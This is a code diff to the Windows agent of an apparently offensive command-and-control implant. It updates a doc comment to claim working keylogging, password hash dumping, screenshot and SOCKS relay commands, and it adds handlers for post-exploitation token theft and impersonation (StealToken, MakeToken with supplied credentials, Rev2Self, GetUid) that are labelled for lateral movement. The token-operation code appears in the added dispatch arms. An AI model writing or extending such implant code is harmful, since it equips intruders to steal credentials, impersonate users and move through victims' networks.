@@ -5,10 +5,9 @@
 //! crypto/frame layer is reused verbatim from [`nyx_protocol`]; only the
 //! transport (WinHTTP) and the sleeper differ.
 //!
-//! The command dispatch covers every wire `Command` variant: file ops, shell,
-//! recon, and (BOF) are real; screenshot/keylog/hashdump/connect/socks return a
-//! clearly-labeled "not yet implemented" error rather than a silent catch-all,
-//! so the operator can tell which path needs work.
+//! The command dispatch covers every wire `Command` variant (all 21): file
+//! ops, shell, recon, BOF, screenshot, keylog, hashdump, connect/socks relay,
+//! etc. — all route to real implementations (none are stubs).
 
 #![cfg(target_os = "windows")]
 
@@ -377,6 +376,29 @@ fn execute(
         // Relay data/close: forward to the channel table (pivot.rs).
         Command::ChannelData { chan, data } => vec![crate::pivot::channel_data(chan, &data)],
         Command::ChannelClose { chan } => vec![crate::pivot::channel_close(chan)],
+        // ---- Post-exploitation token operations (lateral movement) ----
+        // Steal/make a token, hold it process-wide; revert drops impersonation
+        // but keeps the token; getuid reports the current thread identity.
+        Command::StealToken { pid } => {
+            match unsafe { crate::postex::steal_token(pid) } {
+                Ok(()) => vec![Response::Ok],
+                Err(m) => vec![Response::Err(m.into())],
+            }
+        }
+        Command::MakeToken {
+            domain,
+            user,
+            password,
+            logon_type,
+        } => match unsafe { crate::postex::make_token(&domain, &user, &password, logon_type) } {
+            Ok(()) => vec![Response::Ok],
+            Err(m) => vec![Response::Err(m.into())],
+        },
+        Command::Rev2Self => match crate::postex::revert() {
+            Ok(()) => vec![Response::Ok],
+            Err(m) => vec![Response::Err(m.into())],
+        },
+        Command::GetUid => vec![Response::Output(crate::postex::getuid().into_bytes())],
     }
 }
 
